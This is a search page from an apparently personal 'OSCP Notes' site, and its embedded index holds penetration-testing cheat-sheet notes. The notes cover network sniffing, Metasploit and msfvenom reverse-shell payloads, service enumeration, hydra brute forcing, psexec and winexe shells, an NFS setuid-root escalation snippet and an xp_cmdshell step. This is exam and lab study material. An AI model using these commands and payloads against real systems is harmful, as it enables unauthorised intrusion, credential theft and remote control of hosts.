<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Search | OSCP Notes</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Search" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Product documentation template for Jekyll." />
<meta property="og:description" content="Product documentation template for Jekyll." />
<link rel="canonical" href="http://localhost:4000/search/" />
<meta property="og:url" content="http://localhost:4000/search/" />
<meta property="og:site_name" content="OSCP Notes" />
<script type="application/ld+json">
{"@type":"WebPage","url":"http://localhost:4000/search/","headline":"Search","description":"Product documentation template for Jekyll.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/css/main.css">
		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
				OSCP Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/">Hack The Planet</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/0-basics/1-network-basics/">basics</a>
							<ul>
								
									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
								
									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
							<ul>
								
									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
								
									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/2-web/0-initial-enumeration/">web</a>
							<ul>
								
									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
								
									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
								
									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
								
									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
								
									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
								
									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
								
									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
								
									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
								
									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
								
									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
								
									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
								
									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/3-Exploiting/1-webshells/">exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
								
									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/4-win-privesc/1-initial/">win privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
								
									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
							<ul>
								
									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
								
									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
								
									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
								
									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/7-varios/tips/">varios</a>
							<ul>
								
									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
							<ul>
								
									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
								
									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/changelog/"></a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>OSCP Notes</h2>
				<h3>Search</h3>
			</div>
			<article class="content">
				<p><span id="search-process">Loading</span> results <span id="search-query-container" style="display: none;">for "<strong id="search-query"></strong>"</span></p>
<ul id="search-results"></ul>

<script>
	window.data = {
		
			
				
					
					

					"0-basics-1-network-basics": {
						"id": "0-basics-1-network-basics",
						"title": "network basics",
						"category": "",
						"url": " /0-basics/1-network-basics/",
						"content": "WIRESHARK\n\n\nIntro\n\nuse libpcap (linux) or winpcap(win) libraries.\n\ncapture and display filters\n\ncapture: to capture only that\ndisplay: to display only what i want\n\nFollow tcp stream\nright click and “ follow tcp stream”\n\nTCPDump\n\n\n\n  read:\n    tcpdump -r password.pcap\n    \n  \n  filtering:\n     tcpdump -n -r password.pcap | awk -F \" \" '{print $3}' | sort -u | head\n    \n  \n  filtering for src:\n    tcpdump -n src host 172.16.40.10 -r password.pcap\n    \n  \n  filtering for host:\n    tcpdump -n dst host 172.16.40.10 -r password.pcap\n    \n  \n  filtering  for port:\n    tcpdum -n port 81 -r password.pcap\n    \n  \n  Dumping in hex:\n     tcpdump -nX -r password.pcap\n    \n  \n\n\nAdvance header filtering\nwe want to display only the data packets which have the psh and ack flags turned on, these are defined in the 14th byte in the tcp header\nCEUAPRSF -&gt; A and P are ack y push, the binary would be 00011000 which is 24 in decimal.\n\nroot@kali: tcpdump -A -n ' tcp[13]=24' -r password.pcap\n\n\n2.0 Listen to your interface\n\nlistening for outgoing info\ntcpdump -i eth0\n\n\n\nDiscover active IPs usign ARP on the network:\narp-scan $ip/24\n\n\nNetcat port Scanning\n\nnc -nvv -w 1 -z $ip 3388-3390\n\n\n nc -v -z 10.0.3.1 1-65000 &gt; file.txt 2&gt;&amp;1\n\nDiscover active IPs usign ARP on the network:\narp-scan $ip/24\n\n\n\nDiscover who else is on the network\n\nnetdiscover\n\n\nDiscover IP Mac and Mac vendors from ARP\nnetdiscover -r $ip/24\n\n\n2.4 Internal Infrastructure Mapping\n\nping gateway\nnmap -sn -v -PE 192.168.\\*.1\n\n\nNet discover\n   netdiscover -i eth0  -r 10.10.10.0/24 -c 20"
					}

					
				
			
		
			
				
					,
					

					"0-basics-2-metasploit-basics": {
						"id": "0-basics-2-metasploit-basics",
						"title": "metasploit basics",
						"category": "",
						"url": " /0-basics/2-metasploit-basics/",
						"content": "METASPLOIT\n\n\nsetup\nroot@kali: service postgresql start\nroot@kali: service metasploit start\nroot@kali: msfconsole\n\n\n\nauxiliar modules\nmsf&gt; show auxiliary  &lt;-nos muestra lista\nmsf&gt; search snmp\n...\n...\nmsf&gt; use auxiliary/scanner/snmp/snmp_enum\nmsf  auxiliary&gt; info\n...\n...\nmsf auxiliary&gt; show options\nmsf auxiliary&gt; set RHOST 192.168.58.10-20\nmsf auxiliary&gt; SET THREADS 10\nmsf auxiliary&gt; run\n\n\nsmb auxiliary\n   msf &gt; use /../smb_version\n   msf (smb_version)&gt; show options\n   msf (smb_version)&gt; set RHOST 10.10.0.10-20\n   msf (smb_version)&gt; set  THREADS 10\n   msf (smb_version)&gt; run\n\n\nPAYLOADS\n\nstage and non stage payload\n\nstage: send in 2 parts  \nnonstage: 1 payload to rule them all\n\nSTAGE PAYLOAD (meterpreter)\n\nbasics\nmsf exploit(seattlelab)&gt;set PAYLOAD windows/meterpreter/reverse_tcp\nmsf exploit(seattlelab)&gt; show options\nmsf exploit(seattlelab)&gt; exploit\n....\nmeterpreter&gt; help\n...\nmeterpreter&gt;sysinfo\n...\nmeterpreter&gt;getuid\n...\nmeterpreter&gt;search\n...\n\n\nuploading a file\n  meterpreter&gt; upload /usr/share/../nc.exe c:\\\\Users\\\\Offsec\n\n\ndownloading\n  meterpreter&gt; download c:\\\\Windows\\\\system32\\\\calc.exe /tmp/calc.exe\n\nShell\n  meterpreter&gt; shell\n  ...\n  c:\\&gt;\n\nexit\n  c:\\&gt; exit\n  meterpreter&gt; exit -y\n  msf(saras)&gt; back\n  msf &gt;\n\nAdditional payloads\n  msf&gt; use windows/meterpreter/reverse_https\n  msf payload(revers_https) &gt; info\n  ...\n  msf &gt; use windows/meterpreter/reverse_tcp_allports\n  msf payload(reverse_tcp_allports)&gt; info\n\n\nGenerate a binary payload\n\n   msf&gt; msfvenom -l &lt;lista todos los payloads\n\nwe chose one ex: windows/meterpreter/reverse_https\n   msf&gt; msfvenom -p &lt;payload ej reverse&gt;  LHOST=&lt;kali&gt; LPORT=&lt;PORT&gt; -f exe --platform windows -a x86 &gt; /var/www/reverse_met_https.exe\n\n\nmultihandler\n   root@kali: msfconsole\n   msf &gt;  use exploit/multi/handler\n   msf exploit&gt; set PAYLOAD windows/meterpreter/reverse_http (mismo que el binario)\n   msf exploit&gt; show options\n   ....\n   msf exploit&gt; set LHOST &lt; ip &gt;\n   msf exploit&gt; set LPORT &lt;port&gt;\n   msf exploit&gt; exploit\n   ...\n   escuchando en 443\n   ... cuando hagan click\n   meterpreter&gt; :)"
					}

					
				
			
		
			
				
					,
					

					"1-recon-enum-1-0-passive-recon": {
						"id": "1-recon-enum-1-0-passive-recon",
						"title": "passive recon",
						"category": "",
						"url": " /1-recon-enum/1-0-passive-recon/",
						"content": "Objetives\n\n\n  Identify ips\n  identify external sites\n  Identify users\n  Identify technologies\n  Identify content\n  Identify possible vulns\n  identify subdomains\n\n\nemails harvesting\n\ntool: theharvester\n\nroot@kali: theharvester -d cisco.com -b google &gt; google.txt\nroot@kali: theharvester -d cisco.com -l 10 -b bing &gt; bing.txt\n\n\npunk.sh\n\nhttps://blog.hyperiongray.com/introducing-punk-sh/\n\nSiteDigger\n\nhttp://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx\n\nShodan.io\n\nNetcraft\n\n\n  netcraft.com\n  searchdns.netcraft.com"
					}

					
				
			
		
			
				
					,
					

					"1-recon-enum-1-1-port-scanning-server-side-enumeration": {
						"id": "1-recon-enum-1-1-port-scanning-server-side-enumeration",
						"title": "PORT SCANNING",
						"category": "",
						"url": " /1-recon-enum/1-1-port-scanning-server-side-enumeration/",
						"content": "nmap\n\n\n\n  vpn necesita full connect scan:\n    nmap -sT -p- --min-rate=1000 -vvvvv 10.10.10.116 -T4 -oA nmap-ipsec2\n    \n  \n  quick:\n    nmap  -O -sV -Pn -oA nmap/host-quick.txt -v -T4 10.10.10.10\n    \n  \n  complete:\n    nmap -Pn -p-  -oA nmap/full.txt -v -T4 10.10.10.10.\n    \n  \n  correrle script default\n    nmap -Pn -p 139 -sC -sV  -v -T4 -oA nmap/puerto.txt\n    \n    nmap -Pn -p- -sV --script \"vuln and safe\" -vvv -T4 -oA sarasa  10.10.10.135\n    \n  \n  quick through proxy (no and SYN)\n    nmap  -O -sT -Pn -oA nmap/host-quick.txt -v -T4 10.10.10.10\n    \n  \n\n\nex 00\n\nroot@kali:# nmap -v -p 80 --scripts all 192.168.31.210  \n\n\nex1:\nscan cold fusion web server for a directory traversal vulnerability\\\nnmap -v -p 80 --script=http-vuln-cve2010-2861 --scripts-args vulns.showall 192.168.1.210\n\n\nex2:\ncheck for anonymous ftp\nnmap -v -p 21 --script=ftp-anon.nse 192.168.1.200-254\n\n\nex3:\ncheck smb server\nnmap -v -p 139, 445 --script=smb-security-mode 192.168.1.100\n\nex4:\nverify  if servers are patched\nnmap -v -p 80 --script=http-vuln-cve2011-3192  --scripts-args vulns.showall  192.168.11.205-210\n\n\nunicorn scan\n\nuniscan -u 10.10.10.10. -qweds\n\nunicornscan -i tap0 -I -mT $IP:a\ndb_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -p\n\nunicornscan -i tap0 -Iv -mU $IP\ndb_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -sU -p\n\n\nnetcat\n\nbanner grabbing\nnc 192.168.1.2 &lt;port&gt;\n\ntcp scan\nnc -vvn -z 10.10.10.10 1-9000\n\nudp  scan\nnc -vvn -u -z 10.10.10.10 1-9000"
					}

					
				
			
		
			
				
					,
					

					"1-recon-enum-1-3-common-ports": {
						"id": "1-recon-enum-1-3-common-ports",
						"title": "COMMON PORTS",
						"category": "",
						"url": " /1-recon-enum/1-3-common-ports/",
						"content": "FTP\n21\n\n\n\nclient\nftp -p 10.10.10.15\n\n\n  check if can upload  (put)\n  anon logins\n  maybe ftp bounce if needed\n  bruteforce\n  check if version is exploitable(ex ftp-vuln-cve2010-4221.nse,ftp-vsftpd-backdoor.nse)\n\n\nftp bounce\nWe can make an arbritary FTP server port scan another server for us\n\nroot@bha:~# nmap -T0 -v -b username:password@ftpserver.tld:21 victim.tld\n\n\nSSH\n22\n\n\nhydra bruteforce\nroot@kali:~# hydra -s 50220 -L users.txt  -P passwords.txt  &lt;ip a donde atacar&gt; &lt;protocol&gt;\n\n  -l user\n  -s port\n  -L list of user\n  -p password\n  -P list of passwords\n\n\n\nTelnet\n23\n\nroot@kali:~# telnet &lt;ip&gt; &lt;puerto&gt;\n\ntelnet login msf\nuse auxiliary/scanner/telnet/telnet_login\n\n\nnmap NSE\ntelnet-brute.nse\ntelnet-encryption.nse\ntelnet-ntlm-info.nse\n\n\nDNS\n53\n\nwhois\nroot@kali:  whois &lt;domain&gt;\nroot@kali:  whois &lt;ip&gt;\n\n\n\nDig\nroot@kali: dig axfr @dns-server domain.name\n\ndig -x 10.10.10.13 @10.10.10.13\n\nnslookup\nroot@kali:  nslookup &lt;domain&gt;\n\nor\nroot@kali:    nslookup\n&gt;set type=mx  (mail)\nuocra.org\n\n&gt;set type=ns (dns)\nuocra.org\n\n\nZone transfer\n    host -t ns uocra.org\n    host -l uocra.org  &lt;dns to get the transfer&gt;\n\n\ndnsrecon\n root@kali:# dnsrecon -d megacorpone.com -t axfr\n\n\nthe harvester\nscrapea mails y mucha data\n\n :~#theharvester -d cisco.com -l 500 -b all\n\n\nRecon-ng\n\nwebreconnaissance framework written in python\n$ recon-ng  &lt;to start\n$ help &lt; to see help\n$ show modules\n$ load modules\n$ use [module]\n$ show info\n$ set source  \n$ run\n\n\nnmap\n\n  dns hostname lookup\n    nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;`\n    \n  \n  \n    Host Lookup\n    host -t ns megacorpone.com\n   `\n  \n  \n    Reverse Lookup Brute Force - find domains in the same range\n     for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v \"not found\"\n    \n  \n  Perform DNS IP Lookup\n    dig a domain-name-here.com @nameserver\n    \n  \n  Reverse lookup\n    dig -x 10.10.10.13 @nameserver\n    \n  \n  Perform MX Record Lookup\n    dig mx domain-name-here.com @nameserver\n    \n  \n  Perform Zone Transfer with DIG\n    dig axfr domain-name-here.com @nameserver\n    \n  \n  Windows DNS zone transfer\n    nslookup -&gt; set type=any -&gt; ls -d blah.com\n    \n  \n  Linux DNS zone transfer\n    dig axfr blah.com @ns1.blah.com\n    \n  \n  Dnsrecon DNS Brute Force subdomain\n    dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml\n    \n  \n  Dnsrecon DNS List of megacorp\n    dnsrecon -d megacorpone.com -t axfr\n    \n  \n  DNSEnum\n    dnsenum zonetransfer.me\n    \n  \n\n\nSMB/netbios\ntcp: 138,139, 445 udp: 137,138\n\n\npermite anonymous login\n\nThe NetBIOS API and the SMB protocol are generally used together as follows:\n\n\n  An SMB client will use the NetBIOS API to send an SMB command to an SMB server, and to listen for replies from the SMB server.\n  An SMB server will use the NetBIOS API to listen for SMB commands from SMB clients, and to send replies to the SMB client.\n\n\nyou’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP\n\nnmap\nroot@kali:~# nmap -v -p 139,445 --script smb-vuln-* 192.168.56.101\n\nnbtscan\nroot@kali nbtscan -r 192.168.11.0/24\n\nenum4linux\nroot@kali:~# enum4linux -a 192.168.56.101\n\nsmbmap\nsmbmap -H 10.10.10.161\nADMIN$\nC$\nData\n\nsmbmap -H 10.10.10.16 -R DATA #recursive search\nsmbmap -H 10.10.10.16 -R DATA --download 'Data\\\\Search\\\\archivo.txt'\n\n\n  with credentials\n    smbmap -u Tempuser -p Welcome123 -H 10.10.10.16 -R DATA\n    \n  \n  enumerating\n    smbmap -d active.htb -u SVC_TGS -p GPPsaras2012 -H 10.10.10.100\n    \n  \n\n\nsmbclient\nsmbclient \\\\\\\\$ip\\\\$share -I target -N\nsmbclient -N -L 192.168.168.168 - lists smb type (often displaying samba version) and various shares\n\nmount\nsmbclient \\\\\\\\secnotes.htb\\\\new-site -U anonymous\nsmb: \\&gt; RECURSE ON\nsmb: \\&gt; PROMPT OFF\nsmb: \\&gt; mget *\n\n\nrpcclient\nrpcclient -U \"\" target\n\nMount shares\nmount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 \"//10.10.10.10/My Share\" /mnt/cifs\n\n\nmount shares 2\nsudo apt-get install cifs-utils\nmkdir /mnt/Replication\nmount -t cifs //10.10.10.100/Replication /mnt/Replication -o\nusername=&lt;username&gt;,password=&lt;password&gt;,domain=active.htb\ngrep -R password /mnt/Replication/\n\n\nnmblookup\nnmblookup is used to query NetBIOS names and map them to IP addresses in a network using NetBIOS over TCP/IP queries\n nmblookup -A target\n\naccesschk\naccesschk -v -t (target IP) -u user -P /usr/share/dirb/wordlists/common.txt - attempts to connect to $IPC or $ADMIN shares\n\n\nshell when we have the credentials\nroot@kali:# psexec.py secnotes/administrator:@secnotes.htb\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n\nshell 2 when i have credentials\nwinexe -U Administrator //10.0.0.0 \"cmd.exe\"\n\nIf SMB is up locally but the port is closed externally, then try a remote port forward back to your attacking machine:\nplink.exe -l sshproxy -pw sshproxy -R 445:127.0.0.1:445 10.10.10.10\nwinexe -U Administrator //127.0.0.1 \"cmd.exe\"\n\n\nSNMP\nUDP 161 169\n\n\nsnmp parameters\n1.3.6.1.2.1.25.1.6.0    System    Processes\n1.3.6.1.2.1.25.4.2.1.2    Runng    Programs\n1.3.6.1.2.1.25.4.2.1.4    Processes       Path\n1.3.6.1.2.1.25.2.3.1.4    Storage         Units\n1.3.6.1.2.1.25.6.3.1.2    Softwre            Name\n1.3.6.1.4.1.77.1.2.25    User           Accounts\n1.3.6.1.2.1.6.13.1.3   TCP      Local          Ports\n\nMIB TREE\nsnmp management information base (mib) is a database containing information usually related to network management.\n\nscaning for snmp\nnmap -sU --open -p 161 192.168.45.101-190 -oG mega-snmp.txt\n\n\nonesixtyone\nroot:kali echo public &gt; comunity\nroot:kali echo private &gt;&gt; comunity\nroot:kali echo manager &gt;&gt; comunity\nroot:kali for ip in $(seq 200 254); do echo 192.168.56.$ip;done &gt; ips\nroot:kali onexityone -c comunity -i ips\n\n\nsnmp enumeration\n\nsnmpwalk -c public -v1 &lt;ip&gt;\n\nenumeration windows users\nsnmpwalk -c public -v1 192.168.56.101 1.3.6.1.4.1.77.1.2.25  \n\nrunin process\nsnmpwalk -c public -v1 192.168.56.101 1.3.6.1.2.1.25.4.2.1.2  \n\nopen tcp ports\nsnmpwalk -c public -v1 192.168.56.101   1.3.6.1.2.1.6.13.1.3  \n\nproceses\nsnmpwalk -c public -v1 192.168.56.101  1.3.6.1.2.1.25.4.2.1.2\n\n\nsnmpget -v 1 -c public IP\nsnmpwalk -v 1 -c public IP\nsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP\n\n\nipv6\nMost importantly, an IPv6 address is exposed at MiB ​ iso.3.6.1.2.1.4.34.1.5.2.16​ .\n\n\nTFTP\nUDP 69\n\n\n\n  idem FTP\n\n\nEmail\n25/587, 110/995 , 143/993\n\n\nSMTP, POP3(s) and IMAP(s) are good for enumerating users.\n\nAlso: CHECK VERSIONS and searchsploit\n\n1. SMTP\n\nsmtp soporta comandos como VRFY y EXPN\nvrfy request ask the server to verify an email addres.\nEXPN ask the server fot the membership of a mailing list.\n\nex\nnv -nv 192.168.11.215 25\nVRFY root\n\nsmtp-user-enum\nsmtp-user-enum -M VRFY -U users.txt -t 10.0.0.1\nsmtp-user-enum -M EXPN -u admin1 -t 10.0.0.1\nsmtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt\nsmtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1\n\n\nsending an email\n\nHELO my.server.com\nMAIL FROM: &lt;me@mydomain.com&gt;\nRCPT TO: &lt;you@yourdomain.com&gt;\nDATA\nFrom: Danny Dolittle\nTo: Sarah Smith\nSubject: Email sample\nMime-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\n\nThis is a test email for you to read.\n.\nQUIT\n\n\nOpen relay\n\nuse auxiliary/scanner/smtp/smtp_relay\nservices -p 25 -u -R\n\nor nmap\nnmap -iL email_servers -v --script=smtp-open-relay -p 25\n\n\nNSE\nsmtp-brute.nse\nsmtp-commands.nse\nsmtp-enum-users.nse\nsmtp-ntlm-info.nse\nsmtp-open-relay.nse\nsmtp-strangeport.nse\nsmtp-vuln-cve2010-4344.nse\nsmtp-vuln-cve2011-1720.nse\nsmtp-vuln-cve2011-1764.nse\n\n\ncommands\nATRN   Authenticated TURN\nAUTH   Authentication\nBDAT   Binary data\nBURL   Remote content\nDATA   The actual email message to be sent. This command is terminated with a line that contains only a .\nEHLO   Extended HELO\nETRN   Extended turn\nEXPN   Expand\nHELO   Identify yourself to the SMTP server.\nHELP   Show available commands\nMAIL   Send mail from email account\nMAIL FROM: me@mydomain.com\nNOOP   No-op. Keeps you connection open.\nONEX   One message transaction only\nQUIT   End session\nRCPT   Send email to recipient\nRCPT TO: you@yourdomain.com\nRSET   Reset\nSAML   Send and mail\nSEND   Send\nSOML   Send or mail\nSTARTTLS\nSUBMITTER      SMTP responsible submitter\nTURN   Turn\nVERB   Verbose\nVRFY   Verify\n\n\n2 POP\n\nnse\npop3-brute.nse\npop3-capabilities.nse\npop3-ntlm-info.nse\n\n\ncomands\nUSER   Your user name for this mail server\nPASS   Your password.\nQUIT   End your session.\nSTAT   Number and total size of all messages\nLIST   Message# and size of message\nRETR message#  Retrieve selected message\nDELE message#  Delete selected message\nNOOP   No-op. Keeps you connection open.\nRSET   Reset the mailbox. Undelete deleted messages.\n\n\nRPC/NFS y nfs\n111  135 593 , 2049\n\nprotocolo para sistemas de archivos distribuidos\n\nscan\nshowmount -e someexample.com\n\nrpcinfo 111\n\ninstallation\napt-get install rpcbind\n\napt-get install nfs-common\n\n\nrpcinfo -p IP_Address\n\n\nrpcdump\nby impacket\nrpcdump.py 10.10.xx.xx\n\nnmap\nnmap -Pn -sV -script=nfs*\n\nmount the nfs\nmount  -o nolock &lt;ip&gt;:/path_remote   /path/local\n\n$ mkdir backup\n$ mount -o ro,noexec someexample.com:/backup backup\n$ ls backup\nbackup.tar.bz2.zip\n\n$ mount -t nfs someexample.com:/backup backup\n\n\nvulnerabilidad\nchequear  “/etc/exports”\nsi tiene no_root_squash o no_all_squash y tenemos permisos de escritura se puede crear un ejecutable con setuid ej:\n\nint main(void) {\nsetgid(0); setuid(0);\nexecl(“/bin/sh”,”sh”,0); }\n\nchown root.root ./pwnme\nchmod u+s ./pwnme\n\n\nnfshell\n\n  install  https://github.com/NetDirect/nfsshell\n    root@kali:~/Downloads/nfsshell-master# apt-get install libreadline-dev libncurses5-dev\nroot@kali:~/Downloads/nfsshell-master# make\n    \n  \n  use\n    root@kali:~# nfsshell\nnfs&gt; host 10.10.10.34\nnfs&gt; export\nnfs&gt; mount /loquefuere\n    \n  \n\n\nmemcached\n11211\n\nmemcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.\nnmap nse\n\nmemcached-info\n\n\nident\n113\n\nit gives you usernames that are connected to a tcp port.\nhttps://en.wikipedia.org/wiki/Ident_protocol\n\nnmap\nauth-owners.nse\n\n\nipsec/IKE vpn  isakmp\nUDP 500\n\nIPsec is the most commonly used technology for both gateway-to-gateway (LAN-to-LAN) and host to gateway (remote access) enterprise VPN solutions.\n\nIKE is a type of ISAKMP (Internet Security Association Key Management Protocol) implementation, which is a framework for authentication and key exchange. IKE establishes the security association (SA) between two endpoints through a three-phase process:\n\n\n  Phase 1: Establish a secure channel between 2 endpoints using a Pre-Shared Key (PSK) or certificates. It can use main mode (3 pairs of messages) or aggresive mode messages).\n  Phase1.5: This is optional, is called Extended Authentication Phase and authenticates the user that is trying to connect (user+password).\n  Phase2: Negotiates the parameter for the data security using ESP and AH. It can use a different algorithm than the one used in phase 1 (Perfect Forward Secrecy (PFS)).\n\n\n1 find valid info\nike-scan 10.10.10.116\n\n\n  0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway.\n  1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you  proposed are acceptable (a valid transform will be shown in the output)\n  0 returned handshake; 1 returned notify: VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).\n\n\n2 bruteforce\nif you dont get a valid transformation you can try to bruteforce it\n./ikeforce.py -s1 -a &lt;IP&gt; #-s1 for max speed\n\n\n3 server(vendor) fingerprint\nike-scan -M --showbackoff 10.10.10.116\n\n\n4 bruteforce id with ike-scan\nif running the above no hash is returned, bruteforce is probably goingn to work\nike-scan -P -M -A -n fakeID 10.10.10.116\n\nIf some hash is returned, this means that a fake hash is going to be sent back fora fake ID, so this method won’t be reliable to brute-force the ID.\n\nto bruteforce:\npython ikeforce.py 10.10.10.116 -e -w /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt\n\n5 connecting\nstrongswan\nvpn stuff for linux\n\n\n  /etc/ipsec.conf\n    conn Conceal\n      type=transport\n      keyexchange=ikev1\n      right=10.10.10.116\n      authby=psk\n      rightprotoport=tcp\n      leftprotoport=tcp\n      esp=3des-sha1\n      ike=3des-sha1-modp1024\n      auto=start\n    \n  \n  /etc/ipsec.secrets\n    10.10.10.116 : PSK \"Dudecake1!\"\n    \n  \n  stop\n    ipsec stop\n    \n  \n  start\n    ipsec start --nofork\n    \n  \n\n\nMS-SQL\n1433\n\nimpacket\nmssqlclient.py -windows-auth reporting@10.10.10.125\nSQL&gt;\n\nshell\nSQL&gt; enable_xp_cmdshell\nSQL&gt; xp_cmdshell 